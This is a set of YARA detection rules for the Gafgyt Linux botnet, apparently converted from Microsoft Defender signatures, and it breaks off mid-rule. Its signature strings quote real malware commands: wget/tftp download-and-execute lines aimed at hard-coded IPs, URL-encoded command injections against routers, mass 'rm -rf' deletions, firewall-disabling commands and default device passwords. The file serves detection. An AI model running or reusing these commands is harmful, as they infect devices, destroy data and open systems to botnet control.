rule Backdoor_Linux_Gafgyt_A_2147755852_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.A!MTB"
        threat_id = "2147755852"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79" ascii //weight: 1
        $x_1_2 = "KILLALL" ascii //weight: 1
        $x_1_3 = "botname:" ascii //weight: 1
        $x_2_4 = "dayzddos.co" ascii //weight: 2
        $x_1_5 = "vseattack" ascii //weight: 1
        $x_1_6 = "stdhexflood" ascii //weight: 1
        $x_1_7 = "lololololol" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_B_2147760526_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.B!MTB"
        threat_id = "2147760526"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "attack_xmas_flood" ascii //weight: 2
        $x_2_2 = "attack_udp_flood" ascii //weight: 2
        $x_1_3 = "/etc/dropbear/" ascii //weight: 1
        $x_1_4 = "/killallbots" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_C_2147763184_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.C!MTB"
        threat_id = "2147763184"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "217.61.113.40/bins.sh" ascii //weight: 1
        $x_1_2 = "tftp1.sh" ascii //weight: 1
        $x_1_3 = "BillyBobBot" ascii //weight: 1
        $x_1_4 = "FAST-WebCrawler" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_D_2147763335_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.D!MTB"
        threat_id = "2147763335"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "185.132.53.238/infect" ascii //weight: 1
        $x_1_2 = "/tmp/jeSjax" ascii //weight: 1
        $x_1_3 = "ncorrect" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147764082_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.ba!MTB"
        threat_id = "2147764082"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "ba: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "crawler.asp" ascii //weight: 1
        $x_1_2 = "Dont Use the Telnet Scanner" ascii //weight: 1
        $x_1_3 = "botnetTScan" ascii //weight: 1
        $x_1_4 = "rm -rf /tmp/* /var/* /var/run/* /var/tmp/*" ascii //weight: 1
        $x_1_5 = "sendSTDHEX " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147764082_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.ba!MTB"
        threat_id = "2147764082"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "ba: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79" ascii //weight: 1
        $x_1_2 = "46.17.46.22:983" ascii //weight: 1
        $x_1_3 = "service iptables stop" ascii //weight: 1
        $x_1_4 = "KillDevice" ascii //weight: 1
        $x_1_5 = "vseattack" ascii //weight: 1
        $x_1_6 = "SendHTTPHEX" ascii //weight: 1
        $x_1_7 = "Someone tried to kill the bots! Check logs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147764152_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.bc!MTB"
        threat_id = "2147764152"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "bc: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vseattack" ascii //weight: 1
        $x_1_2 = "service iptables stop" ascii //weight: 1
        $x_1_3 = "0n Ur FuCkInG FoReHeAd We BiG L33T HaxEr" ascii //weight: 1
        $x_1_4 = "service firewalld stop" ascii //weight: 1
        $x_1_5 = "SendHTTPHex" ascii //weight: 1
        $x_1_6 = "rm -rf /tmp/* /var/* /var/run/* /var/tmp/*" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147764330_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.cb!MTB"
        threat_id = "2147764330"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "cb: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "httpsattack" ascii //weight: 1
        $x_1_2 = "curl_wget_attack" ascii //weight: 1
        $x_1_3 = "BOT JOINED" ascii //weight: 1
        $x_1_4 = "killer_kill_by_port" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147764417_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.cd!MTB"
        threat_id = "2147764417"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "cd: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killer started" ascii //weight: 1
        $x_1_2 = "hbot proc starting" ascii //weight: 1
        $x_1_3 = "[tel] login attempt [%s:23 %s:%s]" ascii //weight: 1
        $x_1_4 = "/bin/busybox HBOT" ascii //weight: 1
        $x_1_5 = "/bin/busybox chmod 777 .dropper" ascii //weight: 1
        $x_1_6 = "[tel] dropper executed" ascii //weight: 1
        $x_1_7 = "http_attack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147765041_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.cf!MTB"
        threat_id = "2147765041"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "cf: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".KILLFLOODS" ascii //weight: 1
        $x_1_2 = ".KILLPID" ascii //weight: 1
        $x_1_3 = "stop_attack" ascii //weight: 1
        $x_1_4 = "tcp_attack" ascii //weight: 1
        $x_1_5 = "udp_attack" ascii //weight: 1
        $x_1_6 = "std_attack" ascii //weight: 1
        $x_1_7 = "xmas_attack" ascii //weight: 1
        $x_1_8 = "vse_attack" ascii //weight: 1
        $x_1_9 = "killer_start" ascii //weight: 1
        $x_1_10 = "kill_malware" ascii //weight: 1
        $x_1_11 = "rand_cmwc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147765042_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.cg!MTB"
        threat_id = "2147765042"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "cg: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "??h?t?t?p??h?e?x????h?t?t?p??h?e?x????h?t?t?p??h?e?x????h?t?t?p??f?l?o?o?d????h?t?t?p??f?l?o?o?d????h?t?t?p??f?l?o?o?d??" ascii //weight: 1
        $x_1_2 = "??h?t?t?p?r?a?n?d????h?t?t?p?r?a?n?d????h?t?t?p?r?a?n?d????h?t?t?p??f?l?o?o?d????h?t?t?p??f?l?o?o?d????h?t?t?p??f?l?o?o?d??" ascii //weight: 1
        $x_1_3 = "vseattack" ascii //weight: 1
        $x_1_4 = "SendSTDHEX" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_2147765233_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.ch!MTB"
        threat_id = "2147765233"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "ch: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {64 65 73 74 5f 68 6f 73 74 3d 60 62 75 73 79 62 6f 78 2b 77 67 65 74 2b ?? ?? ?? ?? 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 62 69 6e 2b 2d 4f 2b 2f 74 6d 70 2f 67 61 66 3b 73 68 2b 2f 74 6d 70 2f 67 61 66}  //weight: 1, accuracy: Low
        $x_1_2 = "tcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+Amakano.mpsl%3B+wget+http" ascii //weight: 1
        $x_1_3 = "Amakano.mpsl%3B+chmod+777+Amakano.mpsl%3B+.%2FAmakano.mpsl+linksys%60&action=&ttcp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AF_2147766300_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AF!MTB"
        threat_id = "2147766300"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;" ascii //weight: 1
        $x_2_2 = {66 74 70 67 65 74 20 2d 76 20 2d 75 20 61 6e 6f 6e 79 6d 6f 75 73 20 2d 70 20 61 6e 6f 6e 79 6d 6f 75 73 20 2d 50 20 32 31 20 [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 20 66 74 70 ?? 2e 73 68 20 66 74 70 ?? 2e 73 68 3b 20 73 68 20 66 74 70 ?? 2e 73 68}  //weight: 2, accuracy: Low
        $x_2_3 = {63 68 6d 6f 64 [0-5] 74 66 74 70 ?? 2e 73 68 3b 20 73 68 20 74 66 74 70 ?? 2e 73 68 3b 20 74 66 74 70 20 2d 72 20 74 66 74 70 ?? 2e 73 68 20 2d 67 20 [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 3b 20 63 68 6d 6f 64 20 37 37 37}  //weight: 2, accuracy: Low
        $x_1_4 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AH_2147767059_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AH!MTB"
        threat_id = "2147767059"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SendHTTPHex" ascii //weight: 1
        $x_1_2 = "SendSTDHEX" ascii //weight: 1
        $x_1_3 = "TSource Engine Query + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79" ascii //weight: 1
        $x_2_4 = "vseattack" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AI_2147767628_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AI!MTB"
        threat_id = "2147767628"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SendHTTPHex" ascii //weight: 1
        $x_1_2 = "udpfl00d" ascii //weight: 1
        $x_1_3 = "OVHKILL" ascii //weight: 1
        $x_1_4 = "NFOKILL" ascii //weight: 1
        $x_1_5 = "HTTPSTOMP" ascii //weight: 1
        $x_2_6 = "64.225.125.105:6969" ascii //weight: 2
        $x_2_7 = "vseattack" ascii //weight: 2
        $x_2_8 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_1_*))) or
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AJ_2147767824_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AJ!MTB"
        threat_id = "2147767824"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "bins.sh;chmod 777 bins.sh;sh bins.sh;rm -rf bins.sh;history -c" ascii //weight: 3
        $x_1_2 = "telnetadmin" ascii //weight: 1
        $x_1_3 = "vstarcam2015" ascii //weight: 1
        $x_1_4 = "SENDBOTSTO" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AK_2147769604_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AK!MTB"
        threat_id = "2147769604"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/.cowbot.dropper" ascii //weight: 2
        $x_1_2 = "/bin/busybox wget http://%d.%d.%d.%d/unk.sh -O- >.rbot.shell" ascii //weight: 1
        $x_1_3 = "cowffxxna scanner.%s" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AL_2147769608_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AL!MTB"
        threat_id = "2147769608"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {63 64 20 2f 74 6d 70 3b 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 69 6e 66 65 63 74 20 2d 4f}  //weight: 2, accuracy: Low
        $x_1_2 = "jeSjax; busybox chmod 777 jeSjax; sh /tmp/jeSjax" ascii //weight: 1
        $x_1_3 = "STOPPING TELNET SCANNER" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_E_2147779866_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.E"
        threat_id = "2147779866"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "keksec.was.here" ascii //weight: 1
        $x_1_2 = "you have been infected by" ascii //weight: 1
        $x_1_3 = "knownBots" ascii //weight: 1
        $x_1_4 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Gafgyt_E_2147779866_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.E"
        threat_id = "2147779866"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "185.216.213.137" ascii //weight: 2
        $x_2_2 = "193.142.58.171" ascii //weight: 2
        $x_1_3 = "45(432(473(764" ascii //weight: 1
        $x_2_4 = "91.206.92.208" ascii //weight: 2
        $x_1_5 = "botnet" ascii //weight: 1
        $x_1_6 = "botkill" ascii //weight: 1
        $x_2_7 = "$UICIDEBOY$" ascii //weight: 2
        $x_1_8 = "PING" ascii //weight: 1
        $x_1_9 = "PONG" ascii //weight: 1
        $x_1_10 = "B0TK1ll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BB_2147784139_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BB!MTB"
        threat_id = "2147784139"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 2d 67 20 [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 20 2d 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {2f 74 6d 70 2f [0-16] 20 2d 72 20 2f 62 69 6e 73 2f 74 65 6c 6e 65 74 2e 6d 69 70 73}  //weight: 1, accuracy: Low
        $x_1_3 = {63 68 6d 6f 64 20 37 37 37 20 2a 20 2f 74 6d 70 2f [0-16] 3b 20 2f 74 6d 70 2f [0-16] 20 68 75 61 77 65 69}  //weight: 1, accuracy: Low
        $x_1_4 = "busybox+wget+http://34.80.131.135/bins/telnet.arm+-O+/tmp/gaf;sh+/tmp/gaf+gpon80" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_D_2147789482_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.D!xp"
        threat_id = "2147789482"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B" ascii //weight: 2
        $x_1_2 = "/x50/x33/x43/x4B/x24/x54/x20/x47/x38/x33/x41/x52/x44/x20/x30/x4E/x20/x54/x30/x50/x20/x50/x38/x54/x43/x48/x20/x49/x54/x20/x42/x22/x42/x59/" ascii //weight: 1
        $x_1_3 = "HTTPSTOMP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_E_2147789483_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.E!xp"
        threat_id = "2147789483"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f 25 64 2e 25 64 2e 25 64 2e 25 64 2f [0-16] 2e 73 68 20 2d 4f 2d 20 3e 2e [0-16] 2e 73 68 65 6c 6c 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 74 66 74 70 20 2d 67 20 2d 6c 20 2e [0-16] 2e 73 68 65 6c 6c 20 2d 72 20 [0-16] 2e 73 68 20 25 64 2e 25 64 2e 25 64 2e 25 64 3b 20 73 68 20 2e [0-16] 2e 73 68 65 6c 6c}  //weight: 3, accuracy: Low
        $x_1_2 = "/bin/busybox tftp -g -l .riley.binary -r %s %d.%d.%d.%d; /bin/busybox chmod 777 .riley.binary;./.riley.binary tftp;" ascii //weight: 1
        $x_1_3 = "dropper" ascii //weight: 1
        $x_1_4 = "GET /rbot.arm7 HTTP/1.0" ascii //weight: 1
        $x_1_5 = ".rbot.binary" ascii //weight: 1
        $x_1_6 = {65 6e 61 62 6c 65 [0-2] 73 79 73 74 65 6d [0-2] 73 68 65 6c 6c [0-2] 73 68 [0-2] 70 69 6e 67 20 3b 20 73 68}  //weight: 1, accuracy: Low
        $x_1_7 = "/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo" ascii //weight: 1
        $x_1_8 = "[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_F_2147789484_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.F!xp"
        threat_id = "2147789484"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "wget http://46.243.189.101/t.sh; /bin/busybox wget http://46.243.189.101/t.sh; curl -O http://46.243.189.101/t.sh; chmod 777 t.sh; sh t.sh; tftp 46.243.189.101 -c get tt.sh; chmod 777 tt.sh" ascii //weight: 3
        $x_1_2 = "%s iptables -A INPUT -p %s --destination-port %s -j" ascii //weight: 1
        $x_2_3 = "kill -9 `netstat -p -t | grep \"ESTABLISHED\" | grep -v \"ESTABLISHED -\" | grep -v \"46.243.189.101\" | grep -v \":5555\" | grep -v \":5556\"| awk {'print $7}' | awk -F '/' {'print $1'}`" ascii //weight: 2
        $x_2_4 = "/tmp/t.sh; chmod 777 /tmp/t.sh; /tmp/t.sh; /bin/busybox wget http://46.243.189.101/t.sh -O - > /tmp/t.sh" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_G_2147793393_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.G!xp"
        threat_id = "2147793393"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "wget http://badluckjosh.pw/dongs/blj.sh ||" ascii //weight: 1
        $x_1_2 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164" ascii //weight: 1
        $x_1_3 = "sendHOLD" ascii //weight: 1
        $x_1_4 = "sendJUNK" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_G_2147793393_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.G!xp"
        threat_id = "2147793393"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "qC8cVuGTnRH6cfv7sjcYPFv7guAmZxbQRc57fV77IUUj5b6wocpfFJPmHC" ascii //weight: 1
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "lXfYC7TFaCq5Hv982wuIiKcHlgFA0jEsW2OFQStO7x6zN9dBgayyWgvbk0L3lZClzJCmFG3GVNDFc2iTHNYy7gss8dHboBdeKE1VcblH1AxrVyiqokw2RYFvd4cd1QxyaHawwP6go9" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_I_2147793892_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.I!xp"
        threat_id = "2147793892"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 2d 67 [0-48] 20 2d 6c 20 2f 74 6d 70 [0-16] 20 2d 72 20 2f [0-16] 44 65 66 61 75 6c 74 [0-16] 2e 6d 69 70 73 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64 20 37 37 37 20 2a 20 2f 74 6d 70 [0-16] 3b 20 2f 74 6d 70 [0-16] 20 68 75 61 77 65 69 2e 65 78 70 6c 6f 69 74}  //weight: 2, accuracy: Low
        $x_2_2 = {2f 73 68 65 6c 6c 3f 63 64 2b 2f 74 6d 70 3b 72 6d 2b 2d 72 66 2b 2a 3b 77 67 65 74 2b [0-48] 2f 6a 61 77 73 3b 73 68 2b 2f 74 6d 70 2f 6a 61 77 73}  //weight: 2, accuracy: Low
        $x_2_3 = "GET /shell?cd%%20%%2Ftmp%%3Brm%%20-rf%%20%%2A%%3Bwget%%20http%%3A%%2F%%2F%s%%2Farmz.sh%%3Bchmod%%20%%2Bx%%20armz.sh%%3B%%20sh%%20armz.sh" ascii //weight: 2
        $x_1_4 = "oUzilSz14xd2m0LhSdY1TP3UrQZJnthLumEUSgK2yuqBDBlcSg3WggUefEnRTK" ascii //weight: 1
        $x_1_5 = {2e 6d 69 70 73 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64 20 2b 78 20 2f 74 6d 70 2f 2e [0-5] 3b 20 2f 74 6d 70 2f [0-5] 20 68 75 61 77 65 69 2e 6d 69 70 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
